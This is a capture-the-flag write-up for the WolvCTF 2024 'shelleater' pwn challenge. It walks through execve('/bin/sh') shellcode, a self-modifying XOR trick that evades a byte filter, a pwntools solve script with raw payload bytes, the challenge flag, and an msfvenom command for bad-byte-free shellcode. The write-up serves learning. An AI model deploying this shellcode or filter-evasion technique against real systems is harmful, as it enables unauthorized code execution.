+++
title = 'WolvCTF 2024 - pwn/shelleater'
date = 2024-03-18T15:34:02-04:00
draft = false
+++

This was a fun challenge involving shellcode. I solved it the hard way by writing my own shellcode, but I saw two simpler ways to solve it after the CTF were over so I will briefly discuss those at the end.

We are given a file and a netcat port. Taking a look at the file, all protections are off.

```sh
checksec --file=shelleater
[*] '/home/df00/Desktop/shelleater'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Looking at the dissambly, the binary will exectute your shellcode, but not if it contains 0x80 or 0x050f.

```c
void entry(void)

{
  long inc;
  ulong uVar1;
  ulong local_64 [12];
  
  syscall();
  syscall();
  inc = 0;
  do {
    if ((*(ulong *)((long)local_64 + inc) & 0xffff) == 0x50f) goto read_bytes.fail;
    inc = inc + 1;
  } while (inc != 0x60);
  inc = 0;
  while (uVar1 = *(ulong *)((long)local_64 + inc) & 0xff, uVar1 != 0x80) {
    inc = inc + 1;
    if (inc == 0x62) {
                    /* WARNING: Could not recover jumptable at 0x00401086. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      (*(code *)local_64)(0x62,uVar1,0x80);
      return;
    }
  }
read_bytes.fail:
  syscall();
  syscall();
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```

`int 0x80` is used for syscalls, and 0x050f is the assembly for syscall. Let's take a look at really simple shellcode:

```sh
.global _start
_start:
.intel_syntax noprefix

        mov rax, 59
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0

        syscall
binsh:
        .string "/bin/sh"

```

We want to call `execve("/bin/sh", 0, 0)`. Looking at syscall table `https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/`, we need 59 in rax and "/bin/sh" in rdi. rsi and rdx are both zero. When we assemble this, we can that our syscal in assembly is 0x0f05 which we cannot use.

```sh
objdump -M intel -d shellcode-elf

shellcode-elf:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 c7 c0 3b 00 00 00 	mov    rax,0x3b
  401007:	48 8d 3d 10 00 00 00 	lea    rdi,[rip+0x10]        # 40101e <binsh>
  40100e:	48 c7 c6 00 00 00 00 	mov    rsi,0x0
  401015:	48 c7 c2 00 00 00 00 	mov    rdx,0x0
  40101c:	0f 05                	syscall 

000000000040101e <binsh>:
  40101e:	2f                   	(bad)  
  40101f:	62                   	(bad)  
  401020:	69                   	.byte 0x69
  401021:	6e                   	outs   dx,BYTE PTR ds:[rsi]
  401022:	2f                   	(bad)  
  401023:	73 68                	jae    40108d <binsh+0x6f>

```

We can make the code modify itself before execution. We can do many different ways for example using add or sub, but I used xor.

```sh
.global _start
_start:
.intel_syntax noprefix

        xor word ptr [rip+sys], 0x1111
        mov rax, 59
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
sys:
        .byte 0x1e
        .byte 0x14

binsh:
        .string "/bin/sh"
~                         
```

At label sys, we write 2 bytes. If we had written 0x0f05, at runtime this would perform a syscall. Instead, what I did was xor 0x0f05 with 0x1111 which is 0x1e14. Then we write 0x1e14 at sys, and xor sys with 0x1111 at the start.

The final solve script:

```python
from pwn import *

target = remote('shelleater.wolvctf.io', 1337)

target.recv()

payload = "\x66\x81\x35\x1c\x00\x00\x00\x11\x11\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x1e\x14\x2f\x62\x69\x6e\x2f\x73\x68\x00"

target.sendline(payload)

target.interactive()

```

And we get our flag:
`wctf{1_s3ash3ll_1_3at_1t}`

### Other solutions

Other solutions I saw written about after the CTF that were much simpler:

1. msfvenom will generate shellcode for you, and you can specify which bytes to exclude:
`msfvenom -p linux/x64/exec -f c CMD=bash -b '\x80\x0f'`

2. Not sure if this is an intended way to solve this challenge, but the buffer for our shellcode is 100 bytes, and the check for 0x80 only checks the first 98 bytes. Looking online we can find lots of examples of shellcode that end in 0x80 and can pad the shellcode to the end of our buffer.


